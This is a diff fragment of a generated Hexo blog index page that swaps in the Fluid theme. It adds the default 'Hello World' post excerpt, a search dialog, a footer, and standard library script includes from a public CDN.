+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h2 class="index-header">
+        
+        <a href="/2024/09/02/hello-world/" target="_self">
+          Hello World
+        </a>
+      </h2>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/2024/09/02/hello-world/" target="_self">
+        <div>
+          Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2024-09-02 23:27" pubdate>
+              2024-09-02
+            </time>
+          </div>
+        
+        
+        
+      </div>
+    </article>
+  </div>
+
+
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
     
 
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
 
 
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+    <script  src="/js/img-lazyload.js" ></script>
+  
 
 
 
 
-<script src="/js/script.js"></script>
+  <script  src="/js/local-search.js" ></script>
 
 
 
 
 
-  </div>
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
